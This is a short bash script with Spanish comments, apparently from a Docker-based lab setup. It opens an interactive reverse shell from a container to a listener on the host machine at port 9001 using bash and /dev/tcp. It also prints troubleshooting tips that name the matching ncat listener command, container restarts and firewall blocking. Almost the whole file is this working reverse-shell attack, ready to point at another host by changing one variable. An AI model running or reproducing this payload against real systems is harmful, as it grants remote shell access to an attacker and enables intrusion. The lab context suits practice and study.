#!/bin/bash

# CONFIGURACIÓN
# Usamos el nombre mágico que acabas de configurar en docker-compose
TARGET="host.docker.internal"
PORT="9001"

echo "[*] Intentando conectar a Windows en $TARGET:$PORT..."

# 1. Ejecutamos el ataque de Reverse Shell
# Si falla, bash nos devolverá un error que podremos leer
bash -c "bash -i >& /dev/tcp/$TARGET/$PORT 0>&1"

# 2. Si el script llega a esta línea, es que la conexión se ha cerrado o ha fallado
EXIT_CODE=$?

if [ $EXIT_CODE -ne 0 ]; then
    echo ""
    echo "[!] ERROR DE CONEXIÓN (Código: $EXIT_CODE)"
    echo "---------------------------------------------------"
    echo "    1. ¿Has ejecutado 'ncat -lvnp 9001' en Windows?"
    echo "    2. ¿Has reiniciado el contenedor tras cambiar el docker-compose?"
    echo "       (Ejecuta: ./stop.sh  y luego  ./start.sh)"
    echo "    3. ¿El Firewall de Windows sigue bloqueando?"
    echo "---------------------------------------------------"
fi
